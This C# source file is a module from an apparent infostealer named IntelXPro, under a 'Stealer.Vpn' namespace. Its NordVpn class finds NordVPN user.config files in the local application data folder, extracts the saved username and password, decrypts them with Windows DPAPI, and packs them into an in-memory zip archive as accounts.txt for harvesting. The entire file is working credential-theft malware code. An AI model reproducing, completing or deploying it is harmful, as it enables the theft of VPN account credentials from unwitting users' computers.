using IntelXPro.src.IntelXPro.Dependencies.Data;
using IntelXPro.src.IntelXPro.Dependencies.Encryption;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Xml;

namespace IntelXPro.src.IntelXPro.Stealer.Vpn
{
    internal class NordVpn : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "NordVPN"));
            if (!directoryInfo.Exists)
            {
                return;
            }
            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "NordVPN";
            try
            {
                DirectoryInfo[] directories = directoryInfo.GetDirectories("NordVpn.exe*");
                foreach (DirectoryInfo directoryInfo2 in directories)
                {
                    List<string> list = new List<string>();
                    DirectoryInfo[] directories2 = directoryInfo2.GetDirectories();
                    for (int j = 0; j < directories2.Length; j++)
                    {
                        string text = Path.Combine(directories2[j].FullName, "user.config");
                        if (File.Exists(text))
                        {
                            XmlDocument xmlDocument = new XmlDocument();
                            xmlDocument.Load(text);
                            string text2 = Decode(xmlDocument.SelectSingleNode("//setting[@name='Username']/value")?.InnerText);
                            string text3 = Decode(xmlDocument.SelectSingleNode("//setting[@name='Password']/value")?.InnerText);
                            if (!string.IsNullOrEmpty(text2) && !string.IsNullOrEmpty(text3))
                            {
                                list.Add("Username: " + text2 + "\nPassword: " + text3);
                            }
                        }
                    }
                    if (list.Count > 0)
                    {
                        string entryPath = Path.Combine("NordVPN", directoryInfo2.Name, "accounts.txt");
                        counterApplications.Files.Add(directoryInfo2.FullName + " => NordVPN\\");
                        counterApplications.Files.Add("NordVPN\\");
                        zip.AddTextFile(entryPath, string.Join("\n\n", list));
                    }
                }
            }
            catch
            {
            }
            counterApplications.Files.Add("NordVPN\\");
            counter.Vpns.Add(counterApplications);
        }

        private static string Decode(string s)
        {
            return Encoding.UTF8.GetString(DpApi.Decrypt(Convert.FromBase64String(s))) ?? "";
        }
    }
}
